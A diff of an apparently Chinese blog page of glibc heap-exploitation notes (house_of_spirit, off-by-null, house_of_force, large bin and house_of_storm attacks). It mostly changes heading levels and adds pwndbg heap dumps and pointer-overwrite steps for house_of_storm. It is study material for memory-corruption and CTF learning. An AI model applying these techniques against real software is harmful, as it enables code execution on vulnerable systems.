@@ -463,7 +463,7 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h1><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
+                <h2 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h2><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
 #include &lt;assert.h&gt;
 
@@ -492,7 +492,7 @@ void main() &#123;
 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><code>p1</code>被释放进入<code>fastbin</code>之后创建大小属于<code>large bin</code>的堆<code>p3</code>，判断完<code>p3</code>不属于<code>fastbin</code>和<code>small bin</code>之后进行<code>malloc consolidate</code>将<code>p1</code>整理到<code>unsorted bin</code>，又被合并到<code>top chunk</code>,在申请堆<code>p3</code>时就从<code>top chunk</code>取的堆，所以<code>p3</code>和<code>p1</code>地址相同，而此时<code>chunk1</code>地址成为了<code>chunk3</code>的地址，再次释放<code>chunk1</code>释放的就是<code>chunk3</code>，再申请与<code>chunk3</code>大小相同的堆时申请到的就是<code>chunk3</code>地址，因此<code>p4 = p3</code>且两个指针都未置零，因为释放的是<code>p1</code></p>
-<h1 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house_of_spirit"></a>house_of_spirit</h1><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
+<h2 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house_of_spirit"></a>house_of_spirit</h2><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
 
 int main()
@@ -537,7 +537,7 @@ int main()
 0x7fffffffe1f0: 0x00005555555553e0      0x0000000000001234	#next size<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>伪造成功即可释放<code>fake_chunk</code>到<code>bin</code>，其中<code>free</code>的地址是<code>user data</code>地址</p>
-<h1 id="poison-null-byte-x2F-off-by-null"><a href="#poison-null-byte-x2F-off-by-null" class="headerlink" title="poison_null_byte&#x2F;off-by-null"></a>poison_null_byte&#x2F;off-by-null</h1><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
+<h2 id="poison-null-byte-x2F-off-by-null"><a href="#poison-null-byte-x2F-off-by-null" class="headerlink" title="poison_null_byte&#x2F;off-by-null"></a>poison_null_byte&#x2F;off-by-null</h2><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
 #include &lt;string.h&gt;
 #include &lt;stdint.h&gt;
@@ -744,7 +744,7 @@ Addr: 0x55555555c540
 Size: 0x20ac1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>此时将合并的堆申请出来就能实现<code>overlap</code>，即申请的空间覆盖了<code>b2</code></p>
-<h1 id="house-of-lore-x2F-small-bin"><a href="#house-of-lore-x2F-small-bin" class="headerlink" title="house_of_lore&#x2F;small bin"></a>house_of_lore&#x2F;small bin</h1><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;*
+<h2 id="house-of-lore-x2F-small-bin"><a href="#house-of-lore-x2F-small-bin" class="headerlink" title="house_of_lore&#x2F;small bin"></a>house_of_lore&#x2F;small bin</h2><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;*
 Advanced exploitation of the House of Lore - Malloc Maleficarum.
 This PoC take care also of the glibc hardening of smallbin corruption.
 [ ... ]
@@ -871,7 +871,7 @@ if (__glibc_unlikely (bck-&gt;fd !&#x3D; victim))
                &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>从<code>small bin</code> 申请堆的时候会判断最后一个堆的<code>bk</code>指向的堆的<code>fd</code>是否是该堆，因此在需要申请的位置后面还要再伪造一个堆</p>
-<h1 id="overlapping-chunks"><a href="#overlapping-chunks" class="headerlink" title="overlapping_chunks"></a>overlapping_chunks</h1><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;*
+<h2 id="overlapping-chunks"><a href="#overlapping-chunks" class="headerlink" title="overlapping_chunks"></a>overlapping_chunks</h2><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;*
  A simple tale of overlapping chunk.
  This technique is taken from
  http:&#x2F;&#x2F;www.contextis.com&#x2F;documents&#x2F;120&#x2F;Glibc_Adventures-The_Forgotten_Chunks.pdf
@@ -996,7 +996,7 @@ Addr: 0x55555555b280
 Size: 0x20d81<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>实现效果：存在两个堆，使得上一个堆覆盖到下一个堆</p>
-<h1 id="overlapping-chunks-2"><a href="#overlapping-chunks-2" class="headerlink" title="overlapping_chunks_2"></a>overlapping_chunks_2</h1><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;*
+<h2 id="overlapping-chunks-2"><a href="#overlapping-chunks-2" class="headerlink" title="overlapping_chunks_2"></a>overlapping_chunks_2</h2><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;*
  Yet another simple tale of overlapping chunk.
  This technique is taken from
  https:&#x2F;&#x2F;loccs.sjtu.edu.cn&#x2F;wiki&#x2F;lib&#x2F;exe&#x2F;fetch.php?media&#x3D;gossip:overview:ptmalloc_camera.pdf.
@@ -1136,7 +1136,7 @@ Size: 0x1fc51<span aria-hidden="true" class="line-numbers-rows"><span></span><sp
 <p>释放被合并的堆的时候会判断下一个堆即第四个堆是被释放的，因此向下合并到第四个堆</p>
 <p>实现效果：存在三个堆，将三个堆合并成一个堆，且可以覆写中间一个堆、中间一个堆始终未被操作</p>
 <p>应用：2.31之前的<code>off-by-null</code>：创建三个堆<code>A、B、C</code>通过<code>off-by-bull</code>溢出<code>B</code>到<code>C</code>使得<code>C</code>的低字节被覆盖为<code>0</code>（注意：被覆盖的堆原始大小要在<code>fx</code>，这样创建的堆实际大小就是<code>10x</code>而不会因为修改了第二位导致错误，且<code>A</code>的大小属于<code>unsorted bin</code>）将<code>C</code>的<code>prve_size</code>改成<code>A</code>和<code>B</code>的大小之和，系统将判断<code>A</code>和<code>B</code>是一个堆并且已经被释放，此时释放<code>A</code>和<code>C</code>，从<code>A</code>到<code>C</code>的区域就会合并成一个堆并释放，而<code>B</code>仍然存在。</p>
-<h1 id="house-of-force-x2F-top-chunk"><a href="#house-of-force-x2F-top-chunk" class="headerlink" title="house_of_force&#x2F;top chunk"></a>house_of_force&#x2F;top chunk</h1><pre class="line-numbers language-C" data-language="C"><code class="language-C">  
+<h2 id="house-of-force-x2F-top-chunk"><a href="#house-of-force-x2F-top-chunk" class="headerlink" title="house_of_force&#x2F;top chunk"></a>house_of_force&#x2F;top chunk</h2><pre class="line-numbers language-C" data-language="C"><code class="language-C">  
 &#x2F;*
    This PoC works also with ASLR enabled.
    It will overwrite a GOT entry so in order to apply exactly this technique RELRO must be disabled.
@@ -1252,7 +1252,7 @@ Allocated chunk			#申请完所求地址之前的所有空间
 Addr: 0x555555558000
 Size: 0x555555558008<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h1 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted_bin_attack"></a>unsorted_bin_attack</h1><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
+<h2 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted_bin_attack"></a>unsorted_bin_attack</h2><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
 
 int main()&#123;
@@ -1304,7 +1304,7 @@ int main()&#123;
 <p>控制 bk 的值就能将 <code>unsorted_chunks (av)</code> 写到任意地址（要减两个机器字长作为<code>prev_size</code>和<code>size</code>，此时<code>Target Value</code> 处于伪造 <code>chunk</code> 的<code>fd</code>处）</p>
 <p><code>victim</code> 的<code>fd</code>在取<code>chunk</code>时并没有发挥作用，所以修改为不合法的值也没有关系，但是<code>unsorted bin </code>链表可能就此破坏，在插入 <code>chunk</code> 时，可能会出现问题</p>
 <p>实现：将<code>unsorted bin</code>中的<code>chunk</code>通过溢出修改<code>bk</code>为要修的地址 - 两个机器字节，再分配掉即可将地址内容改成很大的数值</p>
-<h1 id="house-of-einherjar-off-by-null"><a href="#house-of-einherjar-off-by-null" class="headerlink" title="house_of_einherjar(off-by-null)"></a>house_of_einherjar(off-by-null)</h1><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
+<h2 id="house-of-einherjar-off-by-null"><a href="#house-of-einherjar-off-by-null" class="headerlink" title="house_of_einherjar(off-by-null)"></a>house_of_einherjar(off-by-null)</h2><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
 #include &lt;string.h&gt;
 #include &lt;stdint.h&gt;
@@ -1460,7 +1460,7 @@ Size: 0x00<span aria-hidden="true" class="line-numbers-rows"><span></span><span>
 <li>能够获取到要覆写的地址</li>
 <li>能够在要覆写的地址伪造<code>fake chunk</code>，从而绕过 <code>unlink </code>的检测。</li>
 </ul>
-<h1 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large_bin_attack"></a>large_bin_attack</h1><pre class="line-numbers language-C" data-language="C"><code class="language-C">
+<h2 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large_bin_attack"></a>large_bin_attack</h2><pre class="line-numbers language-C" data-language="C"><code class="language-C">
 #include&lt;stdio.h&gt;
 #include&lt;stdlib.h&gt;
 #include&lt;assert.h&gt;
@@ -1675,7 +1675,7 @@ pwndbg&gt; x&#x2F;gx 0x7fffffffdd68
 
 
 
-<h1 id="house-of-storm-x2F-unsorted-bin-attack-large-bin-attack"><a href="#house-of-storm-x2F-unsorted-bin-attack-large-bin-attack" class="headerlink" title="house_of_storm&#x2F;unsorted bin attack + large bin attack"></a>house_of_storm&#x2F;unsorted bin attack + large bin attack</h1><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
+<h2 id="house-of-storm-x2F-unsorted-bin-attack-large-bin-attack"><a href="#house-of-storm-x2F-unsorted-bin-attack-large-bin-attack" class="headerlink" title="house_of_storm&#x2F;unsorted bin attack + large bin attack"></a>house_of_storm&#x2F;unsorted bin attack + large bin attack</h2><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
 #include &lt;string.h&gt;
 
@@ -1888,7 +1888,100 @@ int main()&#123;
 	return 0;
 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h1 id="mmap-overlapping-chunks-x2F-mmap"><a href="#mmap-overlapping-chunks-x2F-mmap" class="headerlink" title="mmap_overlapping_chunks&#x2F;mmap"></a>mmap_overlapping_chunks&#x2F;mmap</h1><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdlib.h&gt;
+<p>首先创建一个<code>unsorted bin</code>和一个<code>large bin</code>（<code>large bin</code>小于<code>unsorted bin</code></p>
+<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
+Allocated chunk | PREV_INUSE
+Addr: 0x405000
+Size: 0x291
+
+Allocated chunk | PREV_INUSE
+Addr: 0x405290
+Size: 0x4f1
+
+Allocated chunk | PREV_INUSE
+Addr: 0x405780
+Size: 0x21
+
+Allocated chunk | PREV_INUSE
+Addr: 0x4057a0
+Size: 0x4e1
+
+Allocated chunk | PREV_INUSE
+Addr: 0x405c80
+Size: 0x21
+
+Top chunk | PREV_INUSE
+Addr: 0x405ca0
+Size: 0x20361<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>释放<code>large bin</code>和<code>unsroted bin</code>，再创建一个堆并释放掉使得<code>large bin</code>能够真正进入<code>large bin</code></p>
+<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
+Allocated chunk | PREV_INUSE
+Addr: 0x405000
+Size: 0x291
+
+Free chunk (unsortedbin) | PREV_INUSE
+Addr: 0x405290
+Size: 0x4f1
+fd: 0x7ffff7facbe0
+bk: 0x7ffff7facbe0
+
+Allocated chunk
+Addr: 0x405780
+Size: 0x20
+
+Free chunk (largebins) | PREV_INUSE
+Addr: 0x4057a0
+Size: 0x4e1
+fd: 0x7ffff7fad000
+bk: 0x7ffff7fad000
+fd_nextsize: 0x4057a0
+bk_nextsize: 0x4057a0
+
+Allocated chunk
+Addr: 0x405c80
+Size: 0x20
+
+Top chunk | PREV_INUSE
+Addr: 0x405ca0
+Size: 0x20361<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>将<code>unsorted bin</code>的<code>bk</code>改成<code>目标地址 - 0x10</code></p>
+<p>将<code>large bin</code>的<code>bk_nextsize</code>改成<code>目标地址 - 0x28 - offset</code>，<code>fd</code>改成<code>目标地址 - 0x8</code></p>
+<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
+Allocated chunk | PREV_INUSE
+Addr: 0x405000
+Size: 0x291
+
+Free chunk (unsortedbin) | PREV_INUSE
+Addr: 0x405290
+Size: 0x4f1
+fd: 0x7ffff7facbe0
+bk: 0x404070
+
+Allocated chunk
+Addr: 0x405780
+Size: 0x20
+
+Free chunk (largebins) | PREV_INUSE
+Addr: 0x4057a0
+Size: 0x4e1
+fd: 0x7ffff7fad000
+bk: 0x404078
+fd_nextsize: 0x4057a0
+bk_nextsize: 0x404056
+
+Allocated chunk
+Addr: 0x405c80
+Size: 0x20
+
+Top chunk | PREV_INUSE
+Addr: 0x405ca0
+Size: 0x20361<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h2 id="mmap-overlapping-chunks-x2F-mmap"><a href="#mmap-overlapping-chunks-x2F-mmap" class="headerlink" title="mmap_overlapping_chunks&#x2F;mmap"></a>mmap_overlapping_chunks&#x2F;mmap</h2><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdlib.h&gt;
 #include &lt;stdio.h&gt;
 #include &lt;assert.h&gt;
 
@@ -1969,7 +2062,7 @@ int main()&#123;
 	assert(mmap_chunk_2[0] &#x3D;&#x3D; overlapping_chunk[distance]);
 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h1 id="house-of-roman-无show函数"><a href="#house-of-roman-无show函数" class="headerlink" title="house_of_roman(无show函数)"></a>house_of_roman(无show函数)</h1><pre class="line-numbers language-C" data-language="C"><code class="language-C">#define _GNU_SOURCE     &#x2F;* for RTLD_NEXT *&#x2F;
+<h2 id="house-of-roman-无show函数"><a href="#house-of-roman-无show函数" class="headerlink" title="house_of_roman(无show函数)"></a>house_of_roman(无show函数)</h2><pre class="line-numbers language-C" data-language="C"><code class="language-C">#define _GNU_SOURCE     &#x2F;* for RTLD_NEXT *&#x2F;
 #include &lt;stdlib.h&gt;
 #include &lt;stdio.h&gt;
 #include &lt;stdint.h&gt;
@@ -2167,7 +2260,7 @@ comes from.\n&quot;);
 
 
 
-<h1 id="house-of-orange-top-chunk-FSOP"><a href="#house-of-orange-top-chunk-FSOP" class="headerlink" title="house_of_orange(top chunk + FSOP)"></a>house_of_orange(top chunk + FSOP)</h1><pre class="line-numbers language-C" data-language="C"><code class="language-C">#define _GNU_SOURCE
+<h2 id="house-of-orange-top-chunk-FSOP"><a href="#house-of-orange-top-chunk-FSOP" class="headerlink" title="house_of_orange(top chunk + FSOP)"></a>house_of_orange(top chunk + FSOP)</h2><pre class="line-numbers language-C" data-language="C"><code class="language-C">#define _GNU_SOURCE
 #include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
 #include &lt;string.h&gt;
